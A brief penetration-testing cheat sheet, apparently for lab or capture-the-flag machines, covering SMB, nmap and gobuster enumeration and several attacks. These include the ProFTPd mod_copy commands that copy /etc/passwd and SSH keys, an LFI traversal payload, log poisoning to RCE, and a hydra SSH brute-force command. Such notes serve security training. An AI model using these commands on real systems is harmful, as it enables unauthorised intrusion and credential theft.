# Web Enumeration & Exploit Methodologies

## SMB Enumeration
When port 139 or 445 is open, attack SMB immediately.
Tool: `smbclient`
- List shares: `smbclient -L //10.10.10.x -N`
- Connect to a share: `smbclient //10.10.10.x/share_name -N`
- Enumerate users and groups: `enum4linux -a 10.10.10.x`

## Web Directory Fuzzing
When port 80 or 443 is open, search for hidden files and directories.
Tool: `gobuster`
- Basic scan: `gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirb/common.txt -q`
- Scan with extensions: `gobuster dir -u http://10.10.10.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -q`

## Nmap Reconnaissance
A full TCP port scan should be thorough.
Tool: `nmap`
- Basic service scan: `nmap -sV -sC -p- -T4 10.10.10.x`
- If host blocks ping probes: `nmap -sV -Pn 10.10.10.x`

## ProFTPd Exploits
If FTP port 21 is running ProFTPd.
Version 1.3.5 is vulnerable to `mod_copy` exploit.
- Payload to copy file: `site cpfr /etc/passwd` then `site cpto /var/www/html/passwd`
- Can be used to copy SSH keys into writable paths!

## Web LFI (Local File Inclusion)
If a URL looks like `http://.../index.php?page=about.html`, test for LFI.
- Payload: `http://.../index.php?page=../../../../../../etc/passwd`
- Log poisoning to RCE: Include `/var/log/apache2/access.log` using netcat with PHP payload in User-Agent.

## SSH Brute Force
Port 22 SSH.
Tool: `hydra`
- Assuming user is 'admin': `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x`
